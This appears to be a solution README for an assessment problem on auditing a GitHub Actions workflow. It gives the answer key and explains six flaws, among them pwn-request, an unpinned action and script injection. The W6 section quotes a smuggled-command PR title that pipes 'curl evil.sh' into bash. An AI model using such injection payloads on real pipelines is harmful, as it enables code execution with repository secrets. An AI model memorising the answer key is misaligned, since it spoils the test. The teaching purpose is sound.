# Problem-10 — Audit a GitHub Actions Workflow

## Run

```bash
cd Problem-10
python3 audit.py ci.yml
```

## Answer

```
W1,W2,W3,W4,W5,W6|preview-build
```

## ELI15 walkthrough — how each code was decided

Think of the workflow file as a list of instructions a robot runs on GitHub's
computers. The question is: which of six known mistakes did the author make?

**W1 — untrusted PR code runs in a privileged context. PRESENT.**
`on: pull_request_target` is a special trigger: unlike normal `pull_request`, it
runs with the *repository's* secrets and a write-capable token, even for a pull
request from a stranger's fork. That's fine on its own — but the job then does
`actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}`, which
pulls in the stranger's code, and then runs `npm ci && npm run build` on it.
`npm ci` executes lifecycle scripts from *their* `package.json`. So an outsider's
code executes with your secrets. That is the classic pwn-request. Job: `preview-build`.

**W2 — third-party action not pinned to a full SHA. PRESENT.**
Rule says `actions/*` is first-party and may use a tag, so `actions/checkout@v4`,
`actions/setup-node@v4`, `actions/upload-artifact@v4` are all fine.
`acme-ci/deploy-action@dc7966...` is third-party but pinned to a 40-char SHA — fine.
`acme-ci/setup-action@v3` is third-party pinned to a *tag*. A tag can be moved by
whoever owns that repo, so tomorrow `v3` could point at malicious code. Finding present.

**W3 — workflow permissions broader than any job needs. PRESENT.**
Top of file grants `contents: write`, `pull-requests: write`, `id-token: write`.
Now check what jobs actually need: `unit-tests` declares `contents: read`,
`publish` declares `contents: read` + `id-token: write`. `preview-build` declares
nothing, so it inherits everything — but all it does is build and upload an
artifact, which needs read at most. Nothing in the file needs `contents: write`
or `pull-requests: write`. Extra scopes with nobody using them = too broad.

**W4 — secret written to the build log. PRESENT.**
`run: echo "registry token is ${{ secrets.REGISTRY_TOKEN }}"` literally prints it.
(GitHub masks known secrets in logs, but the audit rule is "can appear in step
output", and this is the textbook case.) Contrast the `Deploy` step: it passes
`DEPLOY_TOKEN` via `env:` to a script and never echoes it — that one is safe,
and is the "dangerous-looking but actually safe" decoy.

**W5 — production deploy with no approval gate. PRESENT.**
The `publish` job runs `./scripts/deploy.sh --env production` but the job has no
`environment:` key. `environment:` is what lets you attach required reviewers, so
without it the deploy goes out with zero human approval. (`needs:` and the
`if: github.ref == 'refs/heads/main'` guard are ordering/branch checks, not approval.)

**W6 — event data interpolated into a shell command. PRESENT.**
`echo "Building ${{ github.event.pull_request.title }}" >> notes.txt`.
`${{ ... }}` is substituted as *text into the script before the shell sees it*.
So a PR titled `x"; curl evil.sh | bash; #` becomes real shell commands. The fix
would be `env: TITLE: ${{ ... }}` then `echo "$TITLE"` — the safe pattern the
`Deploy` step uses.

So all six are present, and the abusable job is `preview-build`.

## Deployment

None. This question is a static file audit — there is nothing to host, so
**do not create a render.com service for it.** Submit the string below directly.
(If a future variant asks for a hosted endpoint, the pattern is: Render →
New → Web Service → connect this repo → Root Directory `Problem-10` →
Build `pip install -r requirements.txt` → Start `uvicorn app:app --host 0.0.0.0 --port $PORT`
→ add `AIPIPE_TOKEN` under Environment. Not needed here.)

## AI usage

None needed — no `$AIPIPE_TOKEN` call is required; the audit is deterministic
and the script above proves each finding from the file text.
